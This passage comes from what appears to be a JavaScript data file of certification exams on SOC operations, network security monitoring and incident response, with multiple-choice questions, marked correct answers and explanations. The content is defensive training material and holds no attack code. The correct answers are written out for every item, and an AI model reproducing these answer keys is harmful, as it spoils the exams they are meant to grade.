    description: "Comprehensive final exam covering all 12 modules. You must pass this exam with 80% or higher to earn your SOC Analyst Learning Path certificate.",
    passingScore: 80,
    timeLimit: 90,
    questions: [
      // Module 1 — SOC Foundations
      { id: "sap-q10-1", question: "In the SOC-CMM model, which level indicates processes are documented, standardized, and measured?", options: ["Level 1 – Initial", "Level 2 – Managed", "Level 3 – Defined", "Level 4 – Quantitatively Managed"], correctAnswer: 3, explanation: "Level 4 (Quantitatively Managed) means processes are measured with KPIs and managed using data-driven decisions." },
      { id: "sap-q10-2", question: "A SOC analyst discovers a breach involving EU citizen data. Under GDPR, what is the maximum notification window to the supervisory authority?", options: ["24 hours", "48 hours", "72 hours", "7 days"], correctAnswer: 2, explanation: "GDPR Article 33 requires notification within 72 hours of becoming aware of a personal data breach." },
      { id: "sap-q10-3", question: "What is the primary difference between a L1 and L2 SOC analyst?", options: ["L2 uses different tools", "L1 triages alerts while L2 performs deeper investigation and correlation", "L2 only handles compliance", "L1 writes detection rules"], correctAnswer: 1, explanation: "L1 analysts perform initial triage and escalation, while L2 analysts conduct deeper investigation, threat correlation, and containment." },
      // Module 2 — Network Traffic Analysis
      { id: "sap-q10-4", question: "During packet analysis, you observe a TCP connection with SYN, SYN-ACK, then RST. What does this indicate?", options: ["Successful connection", "Half-open scan (port scan)", "FIN scan", "Connection timeout"], correctAnswer: 1, explanation: "SYN → SYN-ACK → RST is a classic half-open (stealth) port scan — the scanner sends RST instead of completing the handshake." },
      { id: "sap-q10-5", question: "Which DNS record type is commonly abused for data exfiltration via DNS tunneling?", options: ["A records", "MX records", "TXT records", "SOA records"], correctAnswer: 2, explanation: "TXT records can carry arbitrary text data, making them ideal for DNS tunneling and data exfiltration." },
      { id: "sap-q10-6", question: "You see HTTP traffic with unusually long GET parameters containing Base64-encoded strings. What attack technique should you suspect?", options: ["SQL injection", "C2 beaconing via HTTP", "Cross-site scripting", "Directory traversal"], correctAnswer: 1, explanation: "C2 (Command and Control) beacons often embed encoded commands in HTTP GET parameters to blend with normal web traffic." },
      // Module 3 — SIEM Mastery
      { id: "sap-q10-7", question: "In Splunk SPL, what does the 'stats dc(src_ip) as unique_sources by dest_port' query calculate?", options: ["Total traffic per port", "Distinct source IPs connecting to each destination port", "Average connection duration", "Failed login attempts"], correctAnswer: 1, explanation: "dc() counts distinct values — this query finds how many unique source IPs connected to each destination port, useful for detecting port scans." },
      { id: "sap-q10-8", question: "A SIEM correlation rule triggers when 5+ failed logins from the same IP are followed by a successful login within 10 minutes. What attack does this detect?", options: ["Phishing", "Brute force with eventual success", "Lateral movement", "Privilege escalation"], correctAnswer: 1, explanation: "Multiple failures followed by success is the classic signature of a successful brute-force or password-spraying attack." },
      { id: "sap-q10-9", question: "What is the biggest risk of overly sensitive SIEM correlation rules?", options: ["Missing real attacks", "Alert fatigue from excessive false positives", "Increased storage costs", "Slower search performance"], correctAnswer: 1, explanation: "Overly sensitive rules generate excessive false positives, causing alert fatigue — analysts start ignoring or auto-closing alerts, missing real threats." },
      // Module 4 — Endpoint Investigation
      { id: "sap-q10-10", question: "Which Windows registry key is commonly used by malware for persistence via auto-start?", options: ["HKLM\\SYSTEM\\CurrentControlSet", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKLM\\SOFTWARE\\Classes", "HKCU\\Control Panel\\Desktop"], correctAnswer: 1, explanation: "The Run/RunOnce keys under CurrentVersion execute programs at user logon — a top persistence mechanism for malware." },
      { id: "sap-q10-11", question: "You find a suspicious process with PID 4892 spawned by PowerShell. Which Windows Event ID would log this process creation?", options: ["4624", "4688", "7045", "1102"], correctAnswer: 1, explanation: "Event ID 4688 (Process Creation) logs new process details including parent process, command line, and user context." },
      { id: "sap-q10-12", question: "On Linux, an attacker adds a cron job for persistence. Where would you find it?", options: ["/etc/passwd", "/var/log/auth.log", "/etc/crontab and /var/spool/cron/", "/proc/meminfo"], correctAnswer: 2, explanation: "Cron persistence is found in /etc/crontab, /etc/cron.d/, and user-specific files under /var/spool/cron/." },
      // Module 5 — Phishing & Email Analysis
      { id: "sap-q10-13", question: "An email passes SPF but fails DKIM. The 'From' header shows company.com but 'Return-Path' shows attacker.xyz. What is this?", options: ["Legitimate email", "SPF-aligned spoofing", "Domain impersonation with header manipulation", "DMARC pass"], correctAnswer: 2, explanation: "The attacker configured SPF for their domain (attacker.xyz) but spoofed the visible 'From' header — DKIM failure and mismatched domains confirm spoofing." },
      { id: "sap-q10-14", question: "You receive a phishing email with a .html attachment. What is the most likely attack technique?", options: ["Macro-based malware", "HTML smuggling delivering a payload via JavaScript", "Man-in-the-browser", "DNS poisoning"], correctAnswer: 1, explanation: "HTML smuggling uses JavaScript in .html attachments to reconstruct and download malicious payloads, bypassing email gateway file-type scanning." },
      // Module 6 — Incident Handling
      { id: "sap-q10-15", question: "During a ransomware incident, what is the FIRST action an analyst should take?", options: ["Pay the ransom", "Wipe affected systems", "Isolate affected systems from the network", "Notify the media"], correctAnswer: 2, explanation: "Immediate network isolation prevents lateral spread while preserving evidence for investigation." },
      { id: "sap-q10-16", question: "What is the correct order of the NIST incident response lifecycle?", options: ["Detect, Contain, Eradicate, Recover", "Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity", "Identify, Protect, Detect, Respond, Recover", "Triage, Investigate, Remediate, Close"], correctAnswer: 1, explanation: "NIST SP 800-61 defines four phases: Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident Activity." },
      { id: "sap-q10-17", question: "Chain of custody documentation must include all EXCEPT:", options: ["Who handled the evidence", "When it was transferred", "The analyst's personal opinion on guilt", "Hash values of digital evidence"], correctAnswer: 2, explanation: "Chain of custody tracks who, when, where, and integrity (hashes) — personal opinions have no place in evidence documentation." },
      // Module 7 — Cloud Security Monitoring
      { id: "sap-q10-18", question: "An AWS CloudTrail log shows 'DeleteTrail' API call from an unfamiliar IAM user. What is the severity?", options: ["Low — routine maintenance", "Medium — review needed", "Critical — potential attacker covering tracks", "Informational only"], correctAnswer: 2, explanation: "Deleting CloudTrail is a critical indicator of an attacker attempting to disable logging and cover their tracks." },
      { id: "sap-q10-19", question: "In Azure, which log source records sign-in activity including MFA status and conditional access results?", options: ["Activity Log", "Azure AD Sign-in Logs", "Resource Logs", "NSG Flow Logs"], correctAnswer: 1, explanation: "Azure AD Sign-in Logs capture authentication events including MFA challenges, conditional access policy results, and sign-in risk." },
      { id: "sap-q10-20", question: "A Kubernetes pod is running with 'privileged: true' security context. Why is this a critical finding?", options: ["It uses more memory", "The container has full host access, enabling container escape", "It can't connect to services", "It bypasses load balancing"], correctAnswer: 1, explanation: "Privileged containers have unrestricted host access — an attacker inside can escape to the host node and compromise the cluster." },
      // Module 8 — Threat Intelligence & Hunting
      { id: "sap-q10-21", question: "What is the difference between strategic and tactical threat intelligence?", options: ["Strategic is for analysts, tactical is for executives", "Strategic informs long-term decisions for leadership; tactical provides IOCs for defenders", "They are the same thing", "Strategic is automated, tactical is manual"], correctAnswer: 1, explanation: "Strategic TI informs executive risk decisions (trends, actor motivations); tactical TI provides actionable IOCs and TTPs for SOC analysts." },
      { id: "sap-q10-22", question: "In a hypothesis-driven hunt, you hypothesize 'attackers are using living-off-the-land binaries.' Which data source is MOST relevant?", options: ["Firewall logs", "Process creation logs with command-line arguments", "Badge access logs", "DHCP leases"], correctAnswer: 1, explanation: "LOLBin hunting requires process creation logs (Sysmon Event 1 / Windows 4688) with full command-line recording to spot abuse of legitimate tools." },
      { id: "sap-q10-23", question: "What STIX object type represents an adversary group like APT29?", options: ["Indicator", "Intrusion Set", "Observed Data", "Course of Action"], correctAnswer: 1, explanation: "Intrusion Set represents a named threat actor group with associated TTPs, motivations, and attributed campaigns." },
      // Module 9 — Digital Forensics
      { id: "sap-q10-24", question: "During disk imaging, the hash of the image differs from the original. What does this mean?", options: ["The image is fine — hashes vary", "The imaging process corrupted or modified data — the image is forensically unsound", "The drive is encrypted", "Normal for large drives"], correctAnswer: 1, explanation: "Hash mismatch means the forensic image is not a bit-for-bit copy — it cannot be used as evidence and must be re-imaged." },
      { id: "sap-q10-25", question: "You find $STANDARD_INFORMATION timestamps showing 2024 but $FILE_NAME timestamps showing 2025 on the same file. What does this indicate?", options: ["Normal behavior", "Timestomping — the attacker backdated $SI timestamps", "File corruption", "Time zone difference"], correctAnswer: 1, explanation: "$SI timestamps are easily modified by tools like Timestomp, but $FN timestamps are harder to forge — discrepancy proves manipulation." },
      // Cross-Module Scenario Questions
      { id: "sap-q10-26", question: "An alert fires for outbound DNS requests to a domain with high entropy. Network logs show 500+ TXT queries in 10 minutes. Endpoint logs show powershell.exe spawning nslookup. What is happening?", options: ["Normal DNS resolution", "DNS-based data exfiltration via PowerShell", "DNS cache poisoning", "DNSSEC validation"], correctAnswer: 1, explanation: "High-entropy domains + excessive TXT queries + PowerShell launching nslookup = classic DNS tunneling exfiltration pattern." },
      { id: "sap-q10-27", question: "During an investigation, you need to prove that a specific user account accessed sensitive files at 3 AM. Which THREE evidence sources would you correlate?", options: ["Windows 4663 (file access) + 4624 (logon) + VPN logs", "Firewall logs + DNS logs + DHCP", "Email logs + badge access + phone records", "Antivirus alerts + proxy logs + printer logs"], correctAnswer: 0, explanation: "4663 proves file access, 4624 proves authentication, and VPN logs prove remote origin — together they establish who, what, when, and from where." },
      { id: "sap-q10-28", question: "A SIEM alert shows a service account making API calls to AWS S3 at 2 AM. CloudTrail shows ListBuckets followed by GetObject on sensitive data. The account has no recent legitimate usage. Your FIRST action?", options: ["Delete the service account", "Investigate the API call source, verify if the access key is compromised, and isolate", "Ignore — service accounts run automated tasks", "Notify the media"], correctAnswer: 1, explanation: "Investigate first — identify the calling IP, check for key compromise, then isolate. Don't delete (destroys evidence) or ignore (could be active breach)." },
      { id: "sap-q10-29", question: "You're writing an incident report for a phishing attack that led to credential theft and lateral movement. Which section is MOST important for preventing recurrence?", options: ["Executive summary", "Timeline of events", "Lessons learned and recommendations", "Appendix with IOCs"], correctAnswer: 2, explanation: "Lessons learned drive organizational improvement — recommending MFA, email filtering, and user training prevents future similar attacks." },
      { id: "sap-q10-30", question: "Rank the following evidence by volatility (most volatile first): (1) RAM contents, (2) Swap/pagefile, (3) Disk image, (4) Network connections", options: ["4, 1, 2, 3", "1, 4, 2, 3", "3, 2, 1, 4", "2, 3, 4, 1"], correctAnswer: 1, explanation: "Per RFC 3227 order of volatility: RAM (seconds) → Network connections (seconds) → Swap (persistent but overwritten) → Disk (most stable)." }
    ]
  },
  // NETWORK SECURITY MONITORING — FINAL CERTIFICATION EXAM
  {
    quizId: "nsm-q7",
    courseId: "network-security-monitoring",
    title: "NSM Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Network Security Monitoring certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "nsm-q7-1", question: "What is the primary difference between IDS and IPS?", options: ["IDS blocks traffic, IPS monitors", "IDS monitors and alerts, IPS actively blocks malicious traffic", "They are identical", "IPS only works on endpoints"], correctAnswer: 1, explanation: "IDS passively monitors and alerts; IPS sits inline and actively blocks or drops malicious traffic." },
      { id: "nsm-q7-2", question: "Which Wireshark filter shows only HTTP POST requests?", options: ["http.method == GET", "http.request.method == POST", "tcp.port == 80", "http contains POST"], correctAnswer: 1, explanation: "http.request.method == POST filters specifically for HTTP POST requests in Wireshark." },
      { id: "nsm-q7-3", question: "In a TCP three-way handshake, what flags are exchanged?", options: ["SYN, ACK, FIN", "SYN, SYN-ACK, ACK", "RST, SYN, ACK", "FIN, FIN-ACK, ACK"], correctAnswer: 1, explanation: "The three-way handshake is: Client sends SYN → Server responds SYN-ACK → Client sends ACK." },
      { id: "nsm-q7-4", question: "What does a Suricata rule with 'action: drop' do differently from 'action: alert'?", options: ["Nothing different", "Drop silently blocks the packet inline; alert only generates a notification", "Alert blocks the packet", "Drop logs more detail"], correctAnswer: 1, explanation: "In IPS mode, 'drop' blocks the packet and generates an alert; 'alert' only generates the notification without blocking." },
      { id: "nsm-q7-5", question: "Which Suricata keyword inspects the HTTP URI path?", options: ["content", "http_uri", "pcre", "flow"], correctAnswer: 1, explanation: "http_uri matches against the URI path component of HTTP requests, enabling precise URL-based detection." },
      { id: "nsm-q7-6", question: "What is the primary purpose of Zeek's conn.log?", options: ["Log DNS queries", "Record metadata for every network connection including duration, bytes, and state", "Store packet payloads", "Track user logins"], correctAnswer: 1, explanation: "conn.log records connection-level metadata: source/dest IPs, ports, protocol, duration, bytes transferred, and connection state." },
      { id: "nsm-q7-7", question: "You observe DNS queries for random 32-character subdomains of a single domain. What technique is this?", options: ["DNS load balancing", "DNS tunneling for C2 or data exfiltration", "CDN resolution", "DNSSEC validation"], correctAnswer: 1, explanation: "Random long subdomains indicate DNS tunneling — data is encoded in subdomain labels to bypass traditional security controls." },
      { id: "nsm-q7-8", question: "What BPF filter captures only traffic on port 443?", options: ["port 443", "tcp port 443", "dst port 443", "port == 443"], correctAnswer: 0, explanation: "'port 443' captures both TCP and UDP traffic to/from port 443. Use 'tcp port 443' for TCP only." },
      { id: "nsm-q7-9", question: "In Zeek's ssl.log, what does the 'validation_status' field indicate?", options: ["Cipher strength", "Whether the server certificate chain was successfully validated", "TLS version", "Handshake duration"], correctAnswer: 1, explanation: "validation_status shows if Zeek could validate the certificate chain — 'ok' means valid, failures may indicate self-signed or expired certs." },
      { id: "nsm-q7-10", question: "What network behavior indicates lateral movement via SMB?", options: ["HTTPS to external IPs", "Internal host connecting to port 445 on multiple internal hosts sequentially", "DNS queries to public resolvers", "ICMP echo requests"], correctAnswer: 1, explanation: "Sequential SMB (port 445) connections from one internal host to many others indicates lateral movement or SMB-based worm propagation." },
      { id: "nsm-q7-11", question: "What Wireshark feature reconstructs transferred files from packet captures?", options: ["Display filters", "Export Objects (File > Export Objects)", "Statistics panel", "Protocol preferences"], correctAnswer: 1, explanation: "Export Objects extracts files transferred over HTTP, SMB, TFTP, and other protocols directly from the pcap." },
      { id: "nsm-q7-12", question: "A Suricata rule uses 'threshold: type both, track by_src, count 10, seconds 60'. What does this mean?", options: ["Alert on every packet", "Alert once and suppress for 60s after 10 matches from the same source", "Block after 10 packets", "Log every 10th packet"], correctAnswer: 1, explanation: "Type 'both' combines threshold (require N matches) and limit (suppress duplicates) — alert once per 60s window after 10 matches from same source." },
      { id: "nsm-q7-13", question: "What is JA3 fingerprinting used for?", options: ["Identifying file types", "Creating unique fingerprints of TLS client hello parameters to identify applications", "DNS query analysis", "Certificate validation"], correctAnswer: 1, explanation: "JA3 hashes TLS client hello fields (version, ciphers, extensions) creating a fingerprint that identifies the client application regardless of IP." },
      { id: "nsm-q7-14", question: "You see regular outbound connections every 300 seconds to the same external IP on port 8443. What is this pattern?", options: ["Web browsing", "C2 beaconing with a 5-minute interval", "Email checking", "Time synchronization"], correctAnswer: 1, explanation: "Regular interval connections (beaconing) to a fixed external IP on a non-standard port is a strong indicator of C2 communication." },
      { id: "nsm-q7-15", question: "Which Zeek log would help identify a DNS amplification attack?", options: ["conn.log", "dns.log showing large TXT/ANY responses to spoofed source IPs", "http.log", "ssl.log"], correctAnswer: 1, explanation: "DNS amplification uses large responses (TXT/ANY) directed at spoofed victim IPs — dns.log shows query types and response sizes." },
      { id: "nsm-q7-16", question: "What is the purpose of network tap vs SPAN port?", options: ["They are identical", "Tap provides lossless full-duplex copy; SPAN may drop packets under load", "SPAN is more reliable", "Tap only works for wireless"], correctAnswer: 1, explanation: "Network taps provide passive, lossless, full-duplex copies. SPAN ports can drop packets under high load and may miss errors." },
      { id: "nsm-q7-17", question: "How do you detect ICMP tunneling in network traffic?", options: ["Look for ICMP type 8 only", "Unusually large ICMP payloads or high-frequency echo requests with varying data", "Check for ICMP type 0", "Monitor ICMP TTL values"], correctAnswer: 1, explanation: "ICMP tunneling embeds data in echo request/reply payloads — look for abnormally large payloads or high volumes of ICMP with varied data." },
      { id: "nsm-q7-18", question: "What does Zeek's 'notice.log' record?", options: ["All network connections", "High-level security-relevant events and anomalies detected by Zeek's Notice framework", "DNS queries", "File hashes"], correctAnswer: 1, explanation: "notice.log captures security-relevant findings like self-signed certs, SSL errors, scan detection, and custom notices from Zeek scripts." },
      { id: "nsm-q7-19", question: "In Wireshark, how do you follow the full conversation of a TCP stream?", options: ["Apply display filter", "Right-click a packet → Follow → TCP Stream", "Use Statistics menu", "Export as CSV"], correctAnswer: 1, explanation: "Follow TCP Stream reconstructs the entire conversation between client and server, showing data in both directions." },
      { id: "nsm-q7-20", question: "What makes encrypted traffic analysis challenging for NSM?", options: ["It's impossible to analyze", "Content is opaque, requiring metadata analysis (JA3, certificate, timing, volume) instead of payload inspection", "It uses different ports", "It's faster than unencrypted"], correctAnswer: 1, explanation: "Encrypted payloads can't be inspected, so analysts rely on metadata: JA3 fingerprints, certificate details, connection timing, and data volumes." },
      { id: "nsm-q7-21", question: "A host suddenly generates traffic to 1000+ unique destination IPs on port 445 in 2 minutes. What is this?", options: ["Normal file sharing", "SMB worm propagation or network scanning", "Backup operation", "Load balancing"], correctAnswer: 1, explanation: "Rapid connections to many IPs on port 445 indicates SMB-based worm propagation (like WannaCry) or aggressive network scanning." },
      { id: "nsm-q7-22", question: "What Suricata keyword matches on file content extracted from network streams?", options: ["content", "filedata", "http_uri", "flow"], correctAnswer: 1, explanation: "filedata matches on reassembled file content from HTTP, SMTP, and other protocols — used for detecting malicious file transfers." },
      { id: "nsm-q7-23", question: "How does TLS certificate pinning affect network security monitoring?", options: ["Makes monitoring easier", "Prevents MITM inspection proxies from decrypting traffic, creating visibility gaps", "Has no effect", "Improves log quality"], correctAnswer: 1, explanation: "Certificate pinning rejects certificates not matching the expected pin, preventing TLS inspection proxies from intercepting — creating blind spots." },
      { id: "nsm-q7-24", question: "What is the significance of TTL values in network forensics?", options: ["They indicate bandwidth", "TTL reveals hop count and can detect spoofed packets or traceroute activity", "They measure latency", "They indicate encryption strength"], correctAnswer: 1, explanation: "TTL decrements per hop — unusual TTL values can reveal spoofed source IPs, traceroute scanning, or MITM positioning." },
      { id: "nsm-q7-25", question: "You capture traffic showing HTTP requests with 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0)' from a Windows 11 machine. What does this suggest?", options: ["Normal browsing", "Malware using a hardcoded outdated User-Agent string for C2", "Legacy application", "Browser downgrade"], correctAnswer: 1, explanation: "IE6 User-Agent from Windows 11 is impossible legitimately — malware often uses hardcoded outdated User-Agent strings in C2 communication." },
      { id: "nsm-q7-26", question: "What is the advantage of full packet capture (PCAP) over flow data (NetFlow)?", options: ["Uses less storage", "PCAP preserves complete payload content for deep inspection and evidence", "Faster to process", "Easier to store long-term"], correctAnswer: 1, explanation: "PCAP captures entire packets including payloads, enabling content inspection, file extraction, and forensic evidence — NetFlow only records metadata." },
      { id: "nsm-q7-27", question: "How would you detect DNS over HTTPS (DoH) being used to bypass DNS monitoring?", options: ["Monitor port 53", "Identify connections to known DoH resolver IPs (e.g., 1.1.1.1:443, 8.8.8.8:443) or JA3 fingerprints", "Block all HTTPS", "Check DNS logs"], correctAnswer: 1, explanation: "DoH encrypts DNS in HTTPS — detect by monitoring connections to known DoH providers or identifying DoH-specific JA3 fingerprints." },
      { id: "nsm-q7-28", question: "What network evidence would indicate a successful SQL injection attack?", options: ["Normal web traffic", "HTTP responses containing database error messages or bulk data dumps", "High DNS query volume", "ICMP errors"], correctAnswer: 1, explanation: "Successful SQLi shows in HTTP responses — database errors, unexpected data structures, or unusually large response bodies containing exfiltrated data." },
      { id: "nsm-q7-29", question: "In a SOC workflow, when should you escalate a network alert to an incident?", options: ["Never", "When corroborated by multiple data sources confirming malicious activity with business impact", "Immediately on any alert", "Only if the SIEM says so"], correctAnswer: 1, explanation: "Escalate when investigation confirms the alert with additional evidence (endpoint, identity, threat intel) and there's actual or potential business impact." },
      { id: "nsm-q7-30", question: "What is the best practice for sensor placement in a segmented network?", options: ["One sensor at the perimeter only", "Sensors at each trust boundary — perimeter, DMZ, between VLANs, and critical segments", "Sensors only on servers", "One sensor per floor"], correctAnswer: 1, explanation: "Sensors at each trust boundary provide visibility into north-south (perimeter) and east-west (lateral) traffic across all network segments." }
    ]
  },
  // INCIDENT RESPONSE FUNDAMENTALS — FINAL CERTIFICATION EXAM
  {
    quizId: "ir-q7",
    courseId: "incident-response",
    title: "IR Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Incident Response Fundamentals certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "ir-q7-1", question: "What are the four phases of the NIST SP 800-61 incident response lifecycle?", options: ["Identify, Protect, Detect, Respond", "Preparation; Detection & Analysis; Containment, Eradication & Recovery; Post-Incident Activity", "Plan, Do, Check, Act", "Triage, Investigate, Remediate, Close"], correctAnswer: 1, explanation: "NIST SP 800-61 defines: Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident Activity." },
      { id: "ir-q7-2", question: "What is the SANS six-step IR process?", options: ["Plan, Execute, Review, Close, Report, Archive", "Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned", "Detect, Analyze, Contain, Remove, Restore, Report", "Alert, Triage, Investigate, Fix, Test, Document"], correctAnswer: 1, explanation: "SANS PICERL: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned." },
      { id: "ir-q7-3", question: "During preparation, what is the primary purpose of a tabletop exercise?", options: ["Test network bandwidth", "Walk through incident scenarios to identify gaps in plans and communication", "Train new employees", "Audit compliance"], correctAnswer: 1, explanation: "Tabletop exercises simulate incidents to test response procedures, identify weaknesses, and improve team coordination without real impact." },
      { id: "ir-q7-4", question: "An analyst receives an alert for a potential ransomware infection. What should they do FIRST?", options: ["Format the machine", "Verify the alert and assess scope before taking containment action", "Pay the ransom", "Notify the CEO"], correctAnswer: 1, explanation: "Always verify and assess first — determine if the alert is a true positive, identify affected systems, and understand scope before acting." },
      { id: "ir-q7-5", question: "What is the difference between short-term and long-term containment?", options: ["They are the same", "Short-term stops immediate spread (isolate host); long-term applies durable controls (patch, harden) while maintaining operations", "Short-term is for minor incidents only", "Long-term means ignoring the incident"], correctAnswer: 1, explanation: "Short-term containment is immediate (network isolation, disable accounts). Long-term containment applies sustained fixes while keeping business running." },
      { id: "ir-q7-6", question: "What evidence should be collected FIRST based on order of volatility?", options: ["Hard drive image", "Memory (RAM) dump", "System logs", "Registry hives"], correctAnswer: 1, explanation: "RAM is the most volatile — it's lost on reboot. Always collect memory first, then move to less volatile sources per RFC 3227." },
      { id: "ir-q7-7", question: "During eradication, what must you do after removing malware from a compromised system?", options: ["Immediately reconnect to network", "Verify removal, patch the vulnerability exploited, and validate no persistence mechanisms remain", "Delete all user data", "Reinstall the operating system only"], correctAnswer: 1, explanation: "After removal: verify clean state, patch the entry point, check for backdoors/persistence, and validate before returning to production." },
      { id: "ir-q7-8", question: "What is the primary purpose of an incident severity classification matrix?", options: ["Assign blame", "Prioritize response efforts based on business impact, scope, and data sensitivity", "Track employee performance", "Calculate insurance claims"], correctAnswer: 1, explanation: "Severity matrices ensure consistent prioritization — critical incidents (data breach, ransomware) get immediate resources; low-severity get scheduled response." },
      { id: "ir-q7-9", question: "When communicating during a major incident, who should serve as the single point of contact for external parties?", options: ["Any available analyst", "The designated incident commander or communications lead", "The CEO directly", "The IT help desk"], correctAnswer: 1, explanation: "A designated communications lead ensures consistent messaging, prevents conflicting statements, and manages stakeholder expectations." },
      { id: "ir-q7-10", question: "What legal consideration is critical when collecting evidence from a cloud environment?", options: ["Cloud evidence doesn't matter", "Data jurisdiction — evidence may span multiple legal jurisdictions with different privacy laws", "Just download everything", "Only local laws apply"], correctAnswer: 1, explanation: "Cloud data may reside in multiple countries with different privacy laws (GDPR, CCPA) — understand jurisdictional requirements before collection." },
      { id: "ir-q7-11", question: "What makes a forensic image 'forensically sound'?", options: ["It's compressed", "Hash verification proves it's a bit-for-bit copy of the original with documented chain of custody", "It's stored on the cloud", "It's created by law enforcement"], correctAnswer: 1, explanation: "Forensic soundness requires verified hash match (SHA-256), write-blocking during acquisition, and documented chain of custody." },
      { id: "ir-q7-12", question: "During a BEC (Business Email Compromise) incident, what is the FIRST containment action?", options: ["Delete all emails", "Reset compromised credentials and revoke active sessions immediately", "Shut down the mail server", "Notify all employees"], correctAnswer: 1, explanation: "Immediately reset passwords and revoke OAuth tokens/sessions to prevent further unauthorized access before the attacker can pivot." },
      { id: "ir-q7-13", question: "What is the purpose of IOC (Indicator of Compromise) sharing during incident response?", options: ["Show off findings", "Enable other organizations to detect the same threat and improve collective defense", "Required by law", "Only for internal use"], correctAnswer: 1, explanation: "Sharing IOCs (hashes, IPs, domains) via ISACs, STIX/TAXII enables peer organizations to proactively detect and block the same threat." },
      { id: "ir-q7-14", question: "What should a post-incident review (lessons learned) meeting focus on?", options: ["Assigning blame to individuals", "Process improvements, timeline accuracy, communication gaps, and detection enhancements", "Celebrating the team", "Compliance checkbox"], correctAnswer: 1, explanation: "Blameless post-incident reviews focus on what happened, what worked, what didn't, and actionable improvements to prevent recurrence." },
      { id: "ir-q7-15", question: "An attacker uses stolen credentials to access a VPN. What log sources confirm this?", options: ["Only firewall logs", "VPN authentication logs + AD/LDAP logs + endpoint logs showing the source machine", "Email logs only", "Physical access logs only"], correctAnswer: 1, explanation: "Correlate VPN auth logs (login time, IP), AD logs (credential validation), and endpoint logs (source machine activity) to confirm credential abuse." },
      { id: "ir-q7-16", question: "What is 'scope creep' in incident response and how do you prevent it?", options: ["It's a good thing", "Investigation expanding beyond the actual incident boundary — prevent with clear scoping and regular reassessment", "It means the incident is growing", "You can't prevent it"], correctAnswer: 1, explanation: "Scope creep wastes resources investigating unrelated issues. Define incident boundaries early and regularly reassess to stay focused." },
      { id: "ir-q7-17", question: "When is it appropriate to involve law enforcement in an incident?", options: ["Never", "When criminal activity is suspected, data breach notification laws require it, or for evidence preservation orders", "Always, for every incident", "Only for nation-state attacks"], correctAnswer: 1, explanation: "Involve law enforcement for criminal activity, when legally required (breach notification), or when you need legal authority (subpoenas, preservation orders)." },
      { id: "ir-q7-18", question: "What metric measures the average time from detection to containment?", options: ["MTTD", "MTTC (Mean Time to Contain)", "MTTR", "MTTF"], correctAnswer: 1, explanation: "MTTC measures the average time from detecting an incident to successfully containing it — a key IR efficiency metric." },
      { id: "ir-q7-19", question: "During recovery, what must be verified before bringing systems back to production?", options: ["Only that the system boots", "Clean bill of health: malware removed, vulnerability patched, no persistence, monitoring in place", "User passwords changed", "Backup completed"], correctAnswer: 1, explanation: "Before production return: confirm eradication complete, patch applied, persistence removed, enhanced monitoring active, and baseline restored." },
      { id: "ir-q7-20", question: "What is the role of threat intelligence in incident response?", options: ["It's not relevant to IR", "Provides context on attacker TTPs, helps predict next moves, and accelerates investigation through known IOCs", "Only useful for prevention", "Replaces investigation"], correctAnswer: 1, explanation: "TI maps incidents to known threat actors/campaigns, predicts attacker behavior, provides additional IOCs, and helps determine incident severity." },
      { id: "ir-q7-21", question: "A phishing email delivered a trojan that established persistence. Order the IR actions correctly:", options: ["Eradicate, then contain, then detect", "Detect → Contain (isolate host) → Eradicate (remove malware + persistence) → Recover (patch + monitor)", "Recover first, then investigate", "Ignore and monitor"], correctAnswer: 1, explanation: "Follow the lifecycle: detect the compromise, contain by isolating, eradicate malware and persistence mechanisms, then recover with hardening." },
      { id: "ir-q7-22", question: "What is a 'jump bag' in IR preparation?", options: ["A travel bag", "A pre-packed kit with forensic tools, documentation, cables, and storage media for rapid deployment", "A software toolkit", "An emergency contact list"], correctAnswer: 1, explanation: "Jump bags contain physical and digital tools (write blockers, forensic drives, documentation templates) for rapid on-site response." },
      { id: "ir-q7-23", question: "How should you handle conflicting indicators during analysis — some pointing to true positive, others to false positive?", options: ["Close as false positive", "Escalate immediately", "Gather additional evidence from multiple sources to reach a confident determination", "Flip a coin"], correctAnswer: 2, explanation: "When indicators conflict, expand your data sources — check additional logs, threat intel, and endpoint telemetry to build confidence before deciding." },
      { id: "ir-q7-24", question: "What Windows artifacts prove an executable ran on a system?", options: ["File existence alone", "Prefetch files, Shimcache, Amcache, UserAssist, and BAM/DAM", "Only antivirus logs", "Registry Run keys only"], correctAnswer: 1, explanation: "Multiple artifacts independently prove execution: Prefetch (run count/timestamps), Shimcache, Amcache (SHA1 hash), and UserAssist (GUI programs)." },
      { id: "ir-q7-25", question: "What is the biggest risk of not conducting lessons learned after an incident?", options: ["No risk at all", "Repeating the same mistakes — failing to improve processes, close detection gaps, and strengthen defenses", "Wasting time", "Losing certifications"], correctAnswer: 1, explanation: "Without lessons learned, organizations repeat failures — the same attack vectors succeed again, detection gaps persist, and response doesn't improve." },
      { id: "ir-q7-26", question: "During a supply chain compromise, what makes containment uniquely challenging?", options: ["It's the same as any incident", "The malicious code is in trusted, legitimately signed software — you can't just block the vendor", "Supply chain attacks are rare", "Only affects one system"], correctAnswer: 1, explanation: "Supply chain compromises embed in trusted software with valid signatures, making detection and containment complex — blocking the vendor disrupts operations." },
      { id: "ir-q7-27", question: "What information MUST an incident report's executive summary contain?", options: ["Full technical details", "Business impact, scope, timeline summary, and key recommendations in non-technical language", "Every IOC found", "Employee names"], correctAnswer: 1, explanation: "Executive summaries communicate business impact, affected scope, high-level timeline, and actionable recommendations for leadership decision-making." },
      { id: "ir-q7-28", question: "How do you determine if an incident is a data breach requiring notification?", options: ["Every incident is a breach", "Assess if regulated data (PII, PHI, financial) was accessed or exfiltrated, per applicable laws", "Only if data was sold", "Ask the attacker"], correctAnswer: 1, explanation: "A breach requiring notification depends on data type (PII/PHI), access vs exfiltration evidence, and applicable regulations (GDPR, HIPAA, state laws)." },
